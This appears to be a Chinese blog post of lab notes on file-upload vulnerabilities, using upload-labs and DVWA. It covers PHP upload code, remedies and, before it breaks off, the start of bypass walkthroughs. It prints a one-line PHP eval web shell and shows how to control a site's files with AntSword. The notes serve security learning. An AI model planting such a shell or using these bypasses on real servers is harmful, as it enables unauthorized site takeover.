@@ -1,0 +1,875 @@
+<!doctype html><html lang="zh-cn"
+  >
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>文件上传漏洞笔记 - cornradio的技术博客</title><link rel="apple-touch-icon" href="https://cornradio.github.io/hugo/images/favicons/apple-touch-icon.png" sizes="180x180">
+<link rel="icon" href="https://cornradio.github.io/hugo/images/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
+<link rel="icon" href="https://cornradio.github.io/hugo/images/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
+<link rel="manifest" href="https://cornradio.github.io/hugo/images/favicons/manifest.json">
+<link rel="icon" href="https://cornradio.github.io/hugo/images/favicons/favicon.ico">
+<meta name="keywords" content="" />
+<meta name="description" content="" /><meta itemprop="name" content="文件上传漏洞笔记">
+<meta itemprop="description" content="00-文件上传简介 upload-labs 靶场 c0ny1/upload-labs 蚁剑 第一个Shell (yuque.com) 文件上传通常要上传如 php asp 这种文件，服务器在你访问上传的文件后，对文件进行解析/执行。 比如你上"><meta itemprop="datePublished" content="2023-07-31T20:59:37+08:00" />
+<meta itemprop="dateModified" content="2023-07-31T20:59:37+08:00" />
+<meta itemprop="wordCount" content="5098">
+<meta itemprop="keywords" content="渗透测试,upload-labs," /><meta property="og:title" content="文件上传漏洞笔记" />
+<meta property="og:description" content="00-文件上传简介 upload-labs 靶场 c0ny1/upload-labs 蚁剑 第一个Shell (yuque.com) 文件上传通常要上传如 php asp 这种文件，服务器在你访问上传的文件后，对文件进行解析/执行。 比如你上" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cornradio.github.io/hugo/posts/2023-07-31-fileupload/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-07-31T20:59:37+08:00" />
+<meta property="article:modified_time" content="2023-07-31T20:59:37+08:00" /><meta property="og:site_name" content="cornradio的技术博客" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="文件上传漏洞笔记"/>
+<meta name="twitter:description" content="00-文件上传简介 upload-labs 靶场 c0ny1/upload-labs 蚁剑 第一个Shell (yuque.com) 文件上传通常要上传如 php asp 这种文件，服务器在你访问上传的文件后，对文件进行解析/执行。 比如你上"/>
+<link rel="preload" href="https://cornradio.github.io/hugo/css/bundle.min.0f8a4c66cf997def48fb97fc5013eec8ec7ff4a7e8cc37953d3bd9e7c6891247.css" integrity="sha256-D4pMZs&#43;Zfe9I&#43;5f8UBPuyOx/9KfozDeVPTvZ58aJEkc=" crossorigin="anonymous" as="style" onload="this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cornradio.github.io/hugo/css/bundle.min.0f8a4c66cf997def48fb97fc5013eec8ec7ff4a7e8cc37953d3bd9e7c6891247.css" integrity="sha256-D4pMZs&#43;Zfe9I&#43;5f8UBPuyOx/9KfozDeVPTvZ58aJEkc=" crossorigin="anonymous"></noscript></head>
+  <body><script src="https://cornradio.github.io/hugo/js/bootstrap.min.062c2e66b557cb779d59cedff7e0cc76e84beb665a1076e474e87d940be44245.js" integrity="sha256-BiwuZrVXy3edWc7f9&#43;DMduhL62ZaEHbkdOh9lAvkQkU=" crossorigin="anonymous"></script><header><nav class="navbar top-app-bar top-app-bar-expand-lg fixed-top">
+  <div class="container">
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent"
+      aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <i class="fas fa-bars"></i>
+    </button><a class="navbar-brand me-3" href="https://cornradio.github.io/hugo/">CronRadio
+    </a>
+    <button class="navbar-social-share" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasSocialShare"
+  aria-controls="offcanvasSocialShare" aria-label="Toggle social share">
+  <i class="fas fa-share-alt"></i>
+</button>
+
+<div class="offcanvas offcanvas-bottom surface" tabindex="-1" id="offcanvasSocialShare" aria-labelledby="offcanvasSocialShare">
+  <div class="offcanvas-header">
+    <h3 class="offcanvas-title">Share</h3>
+    <button type="button" class="btn btn-sm btn-outline-primary" data-bs-dismiss="offcanvas" aria-label="Close">
+      <i class="fas fa-times"></i>
+    </button>
+  </div>
+  <div class="offcanvas-body">
+    <a class="btn btn-sm btn-outline-primary social-share-button" rel="noopener noreferrer" aria-label="Twitter Share Button"
+      target="_blank" href="https://twitter.com/intent/tweet?title=%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e7%ac%94%e8%ae%b0&url=https%3a%2f%2fcornradio.github.io%2fhugo%2fposts%2f2023-07-31-fileupload%2f">
+      <i class="fab fa-fw fa-twitter"></i> Twitter
+    </a>
+    <a class="btn btn-sm btn-outline-primary social-share-button" rel="noopener noreferrer" aria-label="Facebook Share Button"
+      target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fcornradio.github.io%2fhugo%2fposts%2f2023-07-31-fileupload%2f">
+      <i class="fab fa-fw fa-facebook-f"></i> Facebook
+    </a>
+  </div>
+</div>
+
+    <button class="navbar-settings" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasSettings"
+  aria-controls="offcanvasSettings" aria-label="Toggle settings">
+  <i class="fas fa-ellipsis-v"></i>
+</button>
+
+<div class="offcanvas offcanvas-end surface h-100" tabindex="-1" id="offcanvasSettings" aria-labelledby="offcanvasSettings">
+  <div class="offcanvas-header">
+    <h3 class="offcanvas-title">设置</h3>
+    <button type="button" class="btn btn-sm btn-outline-primary" data-bs-dismiss="offcanvas" aria-label="Close">
+      <i class="fas fa-times"></i>
+    </button>
+  </div>
+  <div class="offcanvas-body">
+
+<section class="setting">
+  <form class="row">
+    <div class="col-auto">
+      <label><i class="fas fa-fw fa-adjust"></i> 模式</label>
+    </div>
+    <div class="col-auto ms-auto">
+      <div class="form-check form-switch">
+        <input class="form-check-input" type="checkbox" id="modeSwitcher">
+      </div>
+    </div>
+  </form>
+</section>
+
+<section class="setting">
+  <form class="font-size-switcher-form row">
+    <div class="col-auto">
+      <label for="fontSize" class="form-label"><i class="fas fa-fw fa-font"></i> 字体大小</label>
+    </div>
+    <div class="col-auto ms-auto">
+      <input type="range" class="form-range" min="-2" max="2" id="fontSize">
+    </div>
+  </form>
+</section>
+
+
+<section class="setting palettes">
+  <form class="row">
+    <div class="col-auto">
+      <label><i class="fas fa-fw fa-palette"></i> 配色</label>
+    </div>
+    <div class="col-auto ms-auto">
+      <a id="btnPalette" class="btn btn-sm btn-outline-primary" role="button" aria-label="palettePicker">
+        <i class="fas fa-eye-dropper"></i>
+      </a>
+    </div>
+  </form>
+  <div class="mt-2 d-flex visually-hidden" id="palettePicker"><button type="button" id="palette-blue" aria-label="蓝色"
+        class="btn btn-sm palette" data-palette="blue">
+      </button><button type="button" id="palette-blue-gray" aria-label="蓝灰色"
+        class="btn btn-sm palette" data-palette="blue-gray">
+      </button><button type="button" id="palette-brown" aria-label="棕色"
+        class="btn btn-sm palette" data-palette="brown">
+      </button><button type="button" id="palette-cyan" aria-label="青色"
+        class="btn btn-sm palette" data-palette="cyan">
+      </button><button type="button" id="palette-green" aria-label="绿色"
+        class="btn btn-sm palette" data-palette="green">
+      </button><button type="button" id="palette-indigo" aria-label="靛青色"
+        class="btn btn-sm palette" data-palette="indigo">
+      </button><button type="button" id="palette-orange" aria-label="橙色"
+        class="btn btn-sm palette" data-palette="orange">
+      </button><button type="button" id="palette-pink" aria-label="粉色"
+        class="btn btn-sm palette" data-palette="pink">
+      </button><button type="button" id="palette-purple" aria-label="紫色"
+        class="btn btn-sm palette" data-palette="purple">
+      </button><button type="button" id="palette-red" aria-label="红色"
+        class="btn btn-sm palette" data-palette="red">
+      </button><button type="button" id="palette-teal" aria-label="蓝绿色"
+        class="btn btn-sm palette" data-palette="teal">
+      </button><button type="button" id="palette-yellow" aria-label="黄色"
+        class="btn btn-sm palette" data-palette="yellow">
+      </button></div>
+</section>
+</div>
+</div>
+
+    <div class="collapse navbar-collapse" tabindex="-1" id="navbarSupportedContent" aria-labelledby="navbarSupportedContent">
+      <form class="search-bar my-1" action="https://cornradio.github.io/hugo/search">
+  <div class="input-group input-group-sm">
+    <span class="btn btn-search disabled position-absolute left-0"><i class="fas fa-fw fa-search"></i></span>
+    <input class="form-control rounded-pill" name="q" type="search" aria-label="Search">
+  </div>
+</form>
+
+      <ul class="navbar-nav ms-auto"><li class="nav-item">
+          <a class="nav-link" href="https://cornradio.github.io/hugo/archives/">
+            <i class="fas fa-fw fa-file-archive"></i>归档
+          </a>
+        </li><li class="nav-item">
+          <a class="nav-link" href="https://cornradio.github.io/hugo/series/">
+            <i class="fas fa-fw fa-folder"></i>专栏
+          </a>
+        </li><li class="nav-item">
+          <a class="nav-link" href="https://cornradio.github.io/hugo/categories/">
+            <i class="fas fa-fw fa-folder"></i>分类
+          </a>
+        </li><li class="nav-item">
+          <a class="nav-link" href="https://cornradio.github.io/hugo/tags/">
+            <i class="fas fa-fw fa-tags"></i>标签
+          </a>
+        </li><li class="nav-item dropdown">
+          <a class="nav-link" id="navbarDropdown-dropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+            <i class="fas fa-fw fa-chevron-circle-down"></i>快速位置
+          </a>
+          <ul class="dropdown-menu" aria-labelledby="navbarDropdown-dropdown"><li>
+              <a class="dropdown-item"
+                href="https://www.google.com.hk/search?q=site%3Acornradio.github.io&#43;a" target="_blank" rel="noopener noreferrer">
+                z用谷歌搜索本站
+              </a>
+            </li><li>
+              <a class="dropdown-item"
+                href="https://cornradio.github.io/unimportant_sites/clock.html" target="_blank" rel="noopener noreferrer">
+                ⌚浏览器电子表
+              </a>
+            </li><li>
+              <a class="dropdown-item"
+                href="https://cornradio.github.io/get%20a%20life2.html" target="_blank" rel="noopener noreferrer">
+                ✈飞机坪
+              </a>
+            </li><li>
+              <a class="dropdown-item"
+                href="http://124.223.57.166/ahk" target="_blank" rel="noopener noreferrer">
+                🅰ahk小工具
+              </a>
+            </li><li>
+              <a class="dropdown-item"
+                href="https://cornradio.github.io/unimportant_sites/my-link.html" target="_blank" rel="noopener noreferrer">
+                🗺小小导航
+              </a>
+            </li></ul>
+        </li></ul>
+    </div>
+  </div>
+</nav>
+</header>
+<main role="main" class="container">
+      <div class="row content">
+<div class="col-lg-8">
+  <div class="container"><nav class="row card component" aria-label="breadcrumb">
+  <div class="card-body">
+    <ol class="breadcrumb "><li class="breadcrumb-item"><a href="https://cornradio.github.io/hugo/">主页</a></li><li class="breadcrumb-item"><a href="https://cornradio.github.io/hugo/posts/">Posts</a></li><li class="breadcrumb-item active">文件上传漏洞笔记</li></ol>
+  </div>
+</nav>    <article class="row card component mb-4 post"><div class="post-panel-wrapper">
+  <div class="d-flex flex-column component rounded post-panel">
+    
+    <a id="sidebarToggler" class="action d-none d-lg-block" role="button">
+  <i class="fas fa-fw fa-expand-alt" data-fa-transform="rotate-45"></i>
+</a>
+  
+    
+
+    
+    <a class="action" data-bs-container="body" data-bs-toggle="popover" data-bs-html="true" data-bs-placement="bottom"
+  data-bs-trigger="focus" tabindex="0" role="button" aria-label="Copyright" 
+  data-bs-content="&lt;a target=&#34;_blank&#34; rel=&#34;license noopener noreferrer&#34; href=&#34;https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh&#34;&gt;CC BY-NC-ND 4.0 &lt;i class=&#34;fab fa-fw fa-creative-commons&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-by&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-nc&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-nd&#34;&gt;&lt;/i&gt;&lt;/a&gt;
+">
+  <i class="fas fa-fw fa-copyright"></i>
+</a>
+    <a class="action" data-bs-toggle="offcanvas" href="#offcanvasTOC" aria-controls="offcanvasTOC" role="button">
+  <i class="fas fa-fw fa-list-alt"></i>
+</a>
+    
+  </div>
+</div>
+<div class="card-body">
+        <h1 class="card-title my-3">文件上传漏洞笔记
+</h1><div class="post-meta"><span class="post-date" title="created on">
+    <i class="fas fa-fw fa-calendar-alt"></i>2023-07-31
+  </span><span class="post-reading-time" title="reading time">
+    <i class="fas fa-fw fa-coffee"></i>11 分钟阅读
+  </span><a href="https://cornradio.github.io/hugo/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="badge rounded-pill text-white bg-primary post-taxonomy">渗透测试</a><a href="https://cornradio.github.io/hugo/tags/upload-labs/" class="badge rounded-pill text-white bg-primary post-taxonomy">upload-labs</a></div>
+<div class="offcanvas offcanvas-end surface h-100" tabindex="-1" id="offcanvasTOC" aria-labelledby="offcanvasTOCLabel">
+  <div class="offcanvas-header">
+    <h2 class="offcanvas-title" id="offcanvasTOCLabel">目录</h5>
+      <button type="button" class="btn btn-sm btn-outline-primary" data-bs-dismiss="offcanvas" aria-label="Close">
+        <i class="fas fa-times"></i>
+      </button>
+  </div>
+  <div class="offcanvas-body">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#00-文件上传简介">00-文件上传简介</a>
+      <ul>
+        <li><a href="#php-例子">php 例子</a></li>
+        <li><a href="#文件上传代码">文件上传代码</a></li>
+        <li><a href="#文件上传的分类">文件上传的分类</a></li>
+        <li><a href="#文件上传漏洞的修复方案">文件上传漏洞的修复方案</a></li>
+      </ul>
+    </li>
+    <li><a href="#01-使用蚁剑">01-使用蚁剑</a></li>
+    <li><a href="#01-dvwa---upload-file">01-DVWA - upload file</a>
+      <ul>
+        <li><a href="#先看一下源代码">先看一下源代码</a></li>
+        <li><a href="#上传一个phpinfo">上传一个phpinfo</a></li>
+      </ul>
+    </li>
+    <li><a href="#02--绕过js文件类型检查">02- 绕过js文件类型检查</a>
+      <ul>
+        <li><a href="#方法1-修改html">方法1 修改html</a></li>
+        <li><a href="#方法2-抓包替换后缀名">方法2 抓包替换后缀名</a></li>
+      </ul>
+    </li>
+    <li><a href="#04-绕过content-type">04-绕过content-type</a>
+      <ul>
+        <li><a href="#使用burp绕过">使用burp绕过</a></li>
+      </ul>
+    </li>
+    <li><a href="#05-绕过简单黑名单">05-绕过简单黑名单</a></li>
+    <li><a href="#06-htaccess文件重写攻击">06-.htaccess文件重写攻击</a></li>
+    <li><a href="#07-大小写绕过">07-大小写绕过</a></li>
+    <li><a href="#08-空格绕过windows服务器点绕过">08-空格绕过、windows服务器点绕过</a>
+      <ul>
+        <li><a href="#空格绕过">空格绕过</a></li>
+        <li><a href="#windows服务器点绕过">windows服务器点绕过</a></li>
+      </ul>
+    </li>
+    <li><a href="#09-ntfs数据流绕过-data">09-NTFS数据流绕过 DATA</a>
+      <ul>
+        <li><a href="#数据流知识">数据流知识</a></li>
+      </ul>
+    </li>
+    <li><a href="#10-windows-叠加特征上传">10-windows 叠加特征上传</a></li>
+    <li><a href="#11-双写文件名">11-双写文件名</a></li>
+    <li><a href="#12-上传参数目录可控">12-上传参数目录可控</a>
+      <ul>
+        <li><a href="#get-方式">Get 方式</a></li>
+        <li><a href="#post-方式">Post 方式</a></li>
+      </ul>
+    </li>
+    <li><a href="#13-文件头检测绕过">13-文件头检测绕过</a>
+      <ul>
+        <li><a href="#基于真正的图片法">基于真正的图片法</a></li>
+        <li><a href="#抓包修改头部法">抓包修改头部法</a></li>
+      </ul>
+    </li>
+    <li><a href="#14-绕过图片二次渲染">14-绕过图片二次渲染</a></li>
+    <li><a href="#15-文件名可控绕过">15-文件名可控绕过</a></li>
+    <li><a href="#17-文件上传其他漏洞">17-文件上传其他漏洞</a></li>
+  </ul>
+</nav>
+  </div>
+</div><div class="post-content mb-3"><h2 id="00-文件上传简介">00-文件上传简介</h2>
+<p>upload-labs 靶场 <a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener noreferrer">c0ny1/upload-labs</a>
+</p>
+<p>蚁剑  <a href="https://www.yuque.com/antswordproject/antsword/qg3g73" target="_blank" rel="noopener noreferrer">第一个Shell (yuque.com)</a>
+</p>
+<p>文件上传通常要上传如 php asp 这种文件，服务器在你访问上传的文件后，对文件进行解析/执行。</p>
+<p>比如你上传了xxx.php ,然后你访问这个文件，这样服务器就会执行你的代码，配合蚁剑你就可以控制整个网站的文件内容。</p>
+<p>upload-labs  打法这里还有个博客，<a href="https://blog.csdn.net/elephantxiang/article/details/120660685?spm=1001.2014.3001.5502" target="_blank" rel="noopener noreferrer">(34条消息) upload-labs通关大全（已完结）_仙女象的博客-CSDN博客</a>
+</p>
+<h3 id="php-例子">php 例子</h3>
+<p>为了理解文件上传，请搭建phpstudy环境，自己运行下面的 html 和 php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;upload.php&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">	<span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;file&#34;</span><span class="p">&gt;</span>Filename:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">	<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">	<span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">	<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Submit&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p><code>&lt;form action=&quot;upload.php&quot;</code> 这里的 <code>upload.php</code> 可以修改成任何网址，对其他网站进行上传。</p>
+<p><code>enctype=&quot;multipart/form-data&quot;</code> 这句保留，表示上传为二进制格式。</p>
+<h3 id="文件上传代码">文件上传代码</h3>
+<p><code>$_FILES[&quot;file&quot;][&quot;error&quot;]</code> == 0 时代表正常无错误</p>
+<ul>
+<li>0; 没有错误发生，文件上传成功。</li>
+<li>1; 上传的文件超过了php.ini 中upload_max_filesize 选项限制的值。</li>
+<li>2; 上传文件的大小超过了HTML 表单中MAX_FILE_SIZE 选项指定的值。</li>
+<li>3; 文件只有部分被上传。</li>
+<li>4; 没有文件被上传。
+如果正常上传后会把文件各种属性和 放置位置 打印。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Error: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br /&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Upload: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br /&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Type: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;type&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br /&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Size: &#34;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;size&#34;</span><span class="p">]</span> <span class="o">/</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34; Kb&lt;br /&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">8</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Stored in: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="文件上传的分类">文件上传的分类</h3>
+<ul>
+<li>任意文件上传漏洞 / 直接文件上传漏洞 （高危）</li>
+<li>有条件的上传漏洞</li>
+<li>权限认证没处理</li>
+<li>上传逻辑有问题</li>
+<li>中间件或者系统特性上传</li>
+</ul>
+<p>如果攻击者能直接上传恶意脚本到网站存放的目录，且这个目录可解析动态脚本语言，那么攻击者就能够直接获取网站权限</p>
+<h3 id="文件上传漏洞的修复方案">文件上传漏洞的修复方案</h3>
+<ul>
+<li>在网站中需要存在上传模块，需要做好权限认证，不能让匿名用户可访问。</li>
+<li>文件上传目录设置为禁止脚本文件执行。这样设置即使被上传后门的动态脚本也不能解析，导致攻击者放弃这个攻击途径。</li>
+<li>设置上传白名单，白名单只允许图片上传如，jpg png gif 其他文件均不允许上传</li>
+<li>上传的后缀名，一定要设置成图片格式如 jpg png gif</li>
+</ul>
+<hr>
+<h2 id="01-使用蚁剑">01-使用蚁剑</h2>
+<ul>
+<li>
+<p>下载 <a href="https://github.com/AntSwordProject/AntSword-Loader/releases" target="_blank" rel="noopener noreferrer">https://github.com/AntSwordProject/AntSword-Loader/releases</a>
+</p>
+</li>
+<li>
+<p>安装的时候他会下载github文件并解压，如果卡住了就自行解压然后重新选择那个目录。</p>
+</li>
+<li>
+<p>参考教程： 蚁剑  <a href="https://www.yuque.com/antswordproject/antsword/qg3g73" target="_blank" rel="noopener noreferrer">第一个Shell (yuque.com)</a>
+</p>
+</li>
+<li>
+<p>上传文件</p>
+<ul>
+<li>因为ant总被火绒拦掉所以…… 我改成了Post  ”ass“</li>
+<li>上传文件内容：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;?php eval($_POST[&#39;ass&#39;]);
+</span></span></code></pre></div></li>
+<li>
+<p>新建站点
+<img class="img-fluid" alt="Imgur" src="https://i.imgur.com/AiuKhN0.png" loading="lazy"
+  
+   />
+
+</p>
+</li>
+<li>
+<p>可以修改/删除/浏览 web站点的所有文件。
+<img class="img-fluid" alt="Imgur" src="https://i.imgur.com/sLFw53X.png" loading="lazy"
+  
+   />
+
+</p>
+</li>
+</ul>
+<hr>
+<h2 id="01-dvwa---upload-file">01-DVWA - upload file</h2>
+<h3 id="先看一下源代码">先看一下源代码</h3>
+<p>vulnerabilities/upload/source/low.php</p>
+<p>如果接收到了上传请求，代码会将上传文件保存到指定的目录中。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span> <span class="s1">&#39;Upload&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="c1">// Where are we going to be writing to?
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="c1"></span>    <span class="nv">$target_path</span>  <span class="o">=</span> <span class="nx">DVWA_WEB_PAGE_TO_ROOT</span> <span class="o">.</span> <span class="s2">&#34;hackable/uploads/&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nv">$target_path</span> <span class="o">.=</span> <span class="nx">basename</span><span class="p">(</span> <span class="nv">$_FILES</span><span class="p">[</span> <span class="s1">&#39;uploaded&#39;</span> <span class="p">][</span> <span class="s1">&#39;name&#39;</span> <span class="p">]</span> <span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="c1">// Can we move the file to the upload folder?
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nx">move_uploaded_file</span><span class="p">(</span> <span class="nv">$_FILES</span><span class="p">[</span> <span class="s1">&#39;uploaded&#39;</span> <span class="p">][</span> <span class="s1">&#39;tmp_name&#39;</span> <span class="p">],</span> <span class="nv">$target_path</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="c1">// No
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="c1"></span>        <span class="k">echo</span> <span class="s1">&#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="c1">// Yes!
+</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span>        <span class="k">echo</span> <span class="s2">&#34;&lt;pre&gt;</span><span class="si">{</span><span class="nv">$target_path</span><span class="si">}</span><span class="s2"> succesfully uploaded!&lt;/pre&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">
+</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
+</span></span></span></code></pre></div><h3 id="上传一个phpinfo">上传一个phpinfo</h3>
+<p>上传phpinfo是为了非暴力测试，攻击的话要用一句话。
+如果phpinfo执行了，Post其实也大差不差。</p>
+<p>要上传的 php 的内容为</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">phpinfo</span><span class="p">();</span>
+</span></span></code></pre></div><hr>
+<h2 id="02--绕过js文件类型检查">02- 绕过js文件类型检查</h2>
+<blockquote>
+<p>适用范围：网站仅仅通过前端js代码进行文件后缀名检测</p>
+</blockquote>
+<p>Pass-01</p>
+<h3 id="方法1-修改html">方法1 修改html</h3>
+<ol>
+<li>打开 F12 ，修改form 的 onsubmit ，删除 checkFile() 函数</li>
+<li>重新上传php文件</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">onsubmit</span><span class="o">=</span><span class="s">&#34;return checkFile()&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">                <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>请选择要上传的图片：<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">                <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;msg&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">                            <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;input_file&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;upload_file&#34;</span><span class="p">&gt;</span>
